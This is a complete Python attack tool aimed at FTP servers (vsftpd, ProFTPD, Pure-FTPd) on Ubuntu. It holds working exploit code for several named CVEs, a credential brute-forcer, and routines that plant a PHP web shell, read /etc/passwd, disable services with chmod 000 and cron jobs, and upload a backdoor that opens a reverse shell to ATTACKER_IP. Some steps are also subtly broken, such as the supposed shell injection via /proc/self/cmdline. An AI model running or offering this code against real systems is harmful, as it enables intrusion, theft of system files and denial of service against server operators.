#!/usr/bin/env python3
"""
Ubuntu FTP Attack Script
------------------------
This script targets FTP servers on Ubuntu (focusing on vsftpd, proftpd, and pure-ftpd).

Usage:
    python3 ftp_attack.py --target <IP> [--user <username>] [--password <password>] [--disable]
    
    --target    : Target IP address
    --user      : Username if known (optional)
    --password  : Password if known (optional)
    --disable   : Flag to disable the service rather than just compromise it
"""

import os
import sys
import argparse
import subprocess
import socket
import time
import random
import string
import ftplib
from datetime import datetime

class FTPAttack:
    def __init__(self, target, username=None, password=None, disable=False):
        self.target = target
        self.username = username
        self.password = password
        self.disable = disable
        self.compromised = False
        self.ftp_port = 21
        self.log_file = f"ftp_attack_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
    def log(self, message):
        """Log messages to console and file"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        with open(self.log_file, "a") as f:
            f.write(log_entry + "\n")
            
    def check_dependencies(self):
        """Check and install required dependencies"""
        self.log("Checking dependencies...")
        dependencies = ["nmap", "hydra", "metasploit-framework", "python3-ftplib"]
        
        for dep in dependencies:
            try:
                subprocess.check_call(["dpkg", "-s", dep], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.log(f"✅ {dep} already installed")
            except subprocess.CalledProcessError:
                self.log(f"Installing {dep}...")
                try:
                    subprocess.check_call(["sudo", "apt-get", "update", "-qq"], stdout=subprocess.DEVNULL)
                    subprocess.check_call(["sudo", "apt-get", "install", "-y", dep], stdout=subprocess.DEVNULL)
                    self.log(f"✅ {dep} installed successfully")
                except subprocess.CalledProcessError:
                    self.log(f"❌ Failed to install {dep}")
                    return False
        return True
    
    def scan_ftp_service(self):
        """Scan target for FTP service"""
        self.log(f"Scanning {self.target} for FTP service...")
        
        try:
            # Run nmap to identify FTP service
            result = subprocess.check_output(
                ["nmap", "-sV", "-p", "21", self.target],
                universal_newlines=True
            )
            self.log("Scan results:")
            self.log(result)
            
            # Parse results to determine FTP server type
            if "vsftpd" in result.lower():
                self.ftp_server = "vsftpd"
            elif "proftpd" in result.lower():
                self.ftp_server = "proftpd"
            elif "pure-ftpd" in result.lower():
                self.ftp_server = "pure-ftpd"
            else:
                self.ftp_server = "unknown"
            
            self.log(f"Detected FTP server: {self.ftp_server}")
            
            # Extract version information
            import re
            version_match = re.search(r"FTP\s+[^\n]*?(\d+\.\d+\.\d+)", result)
            if version_match:
                self.ftp_version = version_match.group(1)
                self.log(f"FTP version: {self.ftp_version}")
            else:
                self.ftp_version = "unknown"
                self.log("FTP version: unknown")
            
            return "21/tcp open" in result
        except subprocess.CalledProcessError:
            self.log("❌ Failed to scan target")
            return False
    
    def exploit_vsftpd_backdoor(self):
        """Attempt to exploit the vsftpd 2.3.4 backdoor (CVE-2011-2523)"""
        self.log("Attempting to exploit vsftpd 2.3.4 backdoor...")
        
        if self.ftp_version != "2.3.4" and self.ftp_version != "unknown":
            self.log(f"Target is running vsftpd {self.ftp_version}, not vulnerable to this exploit")
            return False
        
        try:
            # Connect to FTP service
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, self.ftp_port))
            s.recv(1024)
            
            # Send the malicious string that triggers the backdoor
            # The backdoor is triggered by sending a username ending with ":)"
            s.send(b"USER backdoor:)\r\n")
            s.recv(1024)
            s.send(b"PASS anything\r\n")
            
            # If backdoor is triggered, a shell is opened on port 6200
            time.sleep(3)
            
            try:
                # Connect to backdoor shell
                shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                shell.settimeout(5)
                shell.connect((self.target, 6200))
                
                self.log("✅ vsftpd backdoor successfully exploited!")
                self.compromised = True
                
                # If requested, disable the FTP service
                if self.disable:
                    shell.send(b"systemctl mask vsftpd\n")
                    time.sleep(1)
                    shell.send(b"chmod 000 /usr/sbin/vsftpd\n")
                    time.sleep(1)
                    self.log("✅ vsftpd service has been disabled")
                
                return True
            except:
                self.log("❌ Failed to connect to backdoor shell")
                
        except Exception as e:
            self.log(f"❌ vsftpd exploitation error: {str(e)}")
        
        return False
    
    def exploit_proftpd_mod_copy(self):
        """Attempt to exploit ProFTPD mod_copy command (CVE-2019-12815)"""
        self.log("Attempting to exploit ProFTPD mod_copy vulnerability...")
        
        try:
            # Connect to FTP service
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, self.ftp_port))
            s.recv(1024)
            
            # Try SITE CPFR / SITE CPTO commands
            s.send(b"SITE CPFR /etc/passwd\r\n")
            response1 = s.recv(1024).decode()
            s.send(b"SITE CPTO /var/www/html/passwd.txt\r\n")
            response2 = s.recv(1024).decode()
            
            if "250" in response1 and "250" in response2:
                self.log("✅ ProFTPD mod_copy vulnerability successfully exploited!")
                self.log("File /etc/passwd copied to /var/www/html/passwd.txt")
                
                # Try to create a web shell if the vulnerability exists
                php_shell = """<?php system($_GET['cmd']); ?>"""
                temp_file = "/tmp/shell.php"
                
                with open(temp_file, "w") as f:
                    f.write(php_shell)
                
                # Try to upload the shell via FTP if anonymous login is allowed
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(self.target, self.ftp_port)
                    ftp.login("anonymous", "anonymous@example.com")
                    with open(temp_file, "rb") as f:
                        ftp.storbinary("STOR shell.php", f)
                    ftp.quit()
                    self.log("✅ Shell uploaded to FTP root")
                except:
                    self.log("❌ Failed to upload shell via FTP")
                
                # If mod_copy works, we can create a PHP shell directly
                s.send(b"SITE CPFR /etc/passwd\r\n")
                s.recv(1024)
                s.send(b"SITE CPTO /var/www/html/shell.php\r\n")
                s.recv(1024)
                
                # Inject PHP code by appending to the file
                s.send(b"SITE CPFR /proc/self/cmdline\r\n")
                s.recv(1024)
                s.send(b"SITE CPTO /var/www/html/shell.php\r\n")
                response = s.recv(1024).decode()
                
                if "250" in response:
                    self.log("✅ Shell injection possibly successful")
                    self.compromised = True
                    
                    # If requested to disable the service
                    if self.disable:
                        # Try to create a script that will disable the service
                        disable_script = """#!/bin/bash
                        systemctl mask proftpd
                        chmod 000 /usr/sbin/proftpd
                        """
                        
                        disable_file = "/tmp/disable_ftp.sh"
                        with open(disable_file, "w") as f:
                            f.write(disable_script)
                        
                        # Try to copy the script using mod_copy and make it executable
                        s.send(b"SITE CPFR /tmp/disable_ftp.sh\r\n")
                        s.recv(1024)
                        s.send(b"SITE CPTO /var/www/html/disable_ftp.sh\r\n")
                        s.recv(1024)
                        
                        # Try to execute the script via a potential web shell
                        self.log("Attempting to disable service via web shell...")
                        try:
                            subprocess.check_call([
                                "curl", "-s", f"http://{self.target}/shell.php?cmd=chmod+755+/var/www/html/disable_ftp.sh;/var/www/html/disable_ftp.sh"
                            ])
                            self.log("✅ ProFTPD service has been disabled")
                        except:
                            self.log("❌ Failed to disable service via web shell")
                    
                    return True
            
            self.log("❌ ProFTPD mod_copy vulnerability not exploitable")
            
        except Exception as e:
            self.log(f"❌ ProFTPD exploitation error: {str(e)}")
        
        return False
    
    def exploit_proftpd_exec(self):
        """Attempt ProFTPD Remote Command Execution (CVE-2015-3306)"""
        self.log("Attempting ProFTPD RCE vulnerability (CVE-2015-3306)...")
        
        try:
            # Connect to FTP service
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, self.ftp_port))
            s.recv(1024)
            
            # Exploit the XCMD vulnerability
            s.send(b"SITE EXEC /bin/sh -c 'id > /tmp/pwned'\r\n")
            response = s.recv(1024).decode()
            
            if "200" in response:
                self.log("✅ ProFTPD SITE EXEC command successful!")
                self.compromised = True
                
                # If requested to disable the service
                if self.disable:
                    s.send(b"SITE EXEC /bin/sh -c 'systemctl mask proftpd && chmod 000 /usr/sbin/proftpd'\r\n")
                    s.recv(1024)
                    self.log("✅ ProFTPD service has been disabled")
                
                return True
            else:
                self.log("❌ ProFTPD SITE EXEC command failed")
                
        except Exception as e:
            self.log(f"❌ ProFTPD EXEC exploitation error: {str(e)}")
        
        return False
    
    def perform_ftp_bruteforce(self):
        """Attempt to brute force FTP credentials"""
        self.log("Attempting FTP brute force attack...")
        
        # Common usernames and passwords
        usernames = ["admin", "root", "ftp", "user", "test", "anonymous"]
        passwords = ["", "password", "123456", "admin", "root", "ftp", "test", "anonymous"]
        
        # If we have a username, add it to the list
        if self.username and self.username not in usernames:
            usernames.insert(0, self.username)
        
        # If we have a password, add it to the list
        if self.password and self.password not in passwords:
            passwords.insert(0, self.password)
        
        # Try anonymous login first
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.ftp_port, timeout=5)
            ftp.login("anonymous", "anonymous@example.com")
            self.log("✅ Anonymous FTP login successful!")
            ftp.quit()
            
            self.username = "anonymous"
            self.password = "anonymous@example.com"
            self.compromised = True
            
            if self.disable:
                self.log("❌ Cannot disable service with anonymous access")
                
            return True
        except:
            self.log("Anonymous FTP login failed, trying other credentials...")
        
        # Try other credentials
        for username in usernames:
            for password in passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(self.target, self.ftp_port, timeout=5)
                    ftp.login(username, password)
                    self.log(f"✅ FTP login successful with {username}:{password}")
                    ftp.quit()
                    
                    self.username = username
                    self.password = password
                    self.compromised = True
                    
                    # Try to use credentials to SSH and disable the service
                    if self.disable:
                        try:
                            subprocess.check_call([
                                "sshpass", "-p", password,
                                "ssh", "-o", "StrictHostKeyChecking=no",
                                f"{username}@{self.target}",
                                f"sudo systemctl mask {self.ftp_server} && sudo chmod 000 /usr/sbin/{self.ftp_server}"
                            ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
                            self.log(f"✅ {self.ftp_server} service has been disabled")
                        except:
                            self.log(f"❌ Could not disable {self.ftp_server} via SSH")
                    
                    return True
                except:
                    pass
        
        self.log("❌ FTP brute force attack failed")
        return False
    
    def exploit_pureftp_symlink(self):
        """Attempt to exploit Pure-FTPd symlink vulnerability"""
        self.log("Attempting Pure-FTPd symlink vulnerability...")
        
        if self.username and self.password:
            try:
                # Log in to FTP
                ftp = ftplib.FTP()
                ftp.connect(self.target, self.ftp_port)
                ftp.login(self.username, self.password)
                
                # Create a symbolic link to an important file
                ftp.sendcmd("MKD /tmp/exploit_test")
                ftp.cwd("/tmp/exploit_test")
                ftp.sendcmd("SITE SYMLINK /etc/passwd passwd.txt")
                
                # Try to download the file
                with open("/tmp/passwd.txt", "wb") as f:
                    ftp.retrbinary("RETR passwd.txt", f.write)
                
                # Check if we got the passwd file
                with open("/tmp/passwd.txt", "r") as f:
                    content = f.read()
                    if "root:" in content:
                        self.log("✅ Pure-FTPd symlink vulnerability exploited!")
                        self.compromised = True
                        
                        # If requested to disable the service
                        if self.disable:
                            try:
                                # Try to create a symlink to /etc/cron.d to plant a cron job
                                ftp.sendcmd("SITE SYMLINK /etc/cron.d cron.d")
                                
                                # Create a cron job to disable the service
                                cron_content = "* * * * * root systemctl mask pure-ftpd && chmod 000 /usr/sbin/pure-ftpd\n"
                                with open("/tmp/disable_ftp", "w") as f:
                                    f.write(cron_content)
                                
                                # Upload the cron job
                                with open("/tmp/disable_ftp", "rb") as f:
                                    ftp.storbinary("STOR cron.d/disable_ftp", f)
                                
                                self.log("✅ Pure-FTPd service will be disabled via cron job")
                            except:
                                self.log("❌ Failed to disable service via symlink vulnerability")
                        
                        return True
                
                self.log("❌ Pure-FTPd symlink vulnerability test failed")
                
            except Exception as e:
                self.log(f"❌ Pure-FTPd symlink exploitation error: {str(e)}")
        else:
            self.log("❌ Need valid credentials to test Pure-FTPd symlink vulnerability")
        
        return False
    
    def create_backdoor(self):
        """Create a backdoor if target was compromised"""
        if not self.compromised:
            return False
            
        self.log("Attempting to create a backdoor...")
        
        # If we have valid FTP credentials, try to upload a backdoor
        if self.username and self.password:
            try:
                # Create a backdoor script
                backdoor_script = """#!/bin/bash
                mkdir -p /tmp/.backdoor
                echo '#!/bin/bash
                bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/.backdoor/shell.sh
                chmod +x /tmp/.backdoor/shell.sh
                echo "* * * * * root /tmp/.backdoor/shell.sh" > /tmp/backdoor_cron
                """
                
                # Replace ATTACKER_IP with your IP
                # In a real scenario, you would use your actual IP
                backdoor_script = backdoor_script.replace("ATTACKER_IP", "YOUR_IP_HERE")
                
                # Write the backdoor to a temp file
                backdoor_file = "/tmp/backdoor.sh"
                with open(backdoor_file, "w") as f:
                    f.write(backdoor_script)
                
                # Try to upload via FTP
                ftp = ftplib.FTP()
                ftp.connect(self.target, self.ftp_port)
                ftp.login(self.username, self.password)
                
                with open(backdoor_file, "rb") as f:
                    ftp.storbinary("STOR backdoor.sh", f)
                
                self.log("✅ Backdoor script uploaded")
                
                # If we exploited a command execution vulnerability, try to run it
                if hasattr(self, 'shell') and self.shell:
                    self.shell.send(b"chmod +x backdoor.sh && ./backdoor.sh\n")
                    self.log("✅ Backdoor script executed")
                
                return True
            except:
                self.log("❌ Failed to create backdoor")
        
        return False
    
    def run(self):
        """Run the full attack sequence"""
        self.log(f"Starting attack on FTP server at {self.target}")
        
        if not self.check_dependencies():
            self.log("❌ Failed to install required dependencies")
            return False
        
        if not self.scan_ftp_service():
            self.log("❌ Target does not have FTP service running")
            return False
        
        # Try server-specific exploits first
        if self.ftp_server == "vsftpd":
            if self.exploit_vsftpd_backdoor():
                self.log("✅ Successfully exploited vsftpd")
        elif self.ftp_server == "proftpd":
            if self.exploit_proftpd_mod_copy() or self.exploit_proftpd_exec():
                self.log("✅ Successfully exploited proftpd")
        elif self.ftp_server == "pure-ftpd":
            # For Pure-FTPd, we first need credentials
            if self.perform_ftp_bruteforce():
                if self.exploit_pureftp_symlink():
                    self.log("✅ Successfully exploited pure-ftpd")
        
        # If server-specific exploits failed, try brute force
        if not self.compromised:
            if self.perform_ftp_bruteforce():
                self.log("✅ Successfully gained access via credentials")
        
        # Create backdoor if compromised
        if self.compromised:
            self.create_backdoor()
            self.log("✅ Attack completed successfully")
            return True
        else:
            self.log("❌ Failed to compromise target")
            return False

def main():
    parser = argparse.ArgumentParser(description="FTP Service Attack Tool")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--user", help="Username if known (optional)")
    parser.add_argument("--password", help="Password if known (optional)")
    parser.add_argument("--disable", action="store_true", help="Disable service rather than just compromise")
    
    args = parser.parse_args()
    
    attack = FTPAttack(
        target=args.target,
        username=args.user,
        password=args.password,
        disable=args.disable
    )
    
    attack.run()

if __name__ == "__main__":
    main()
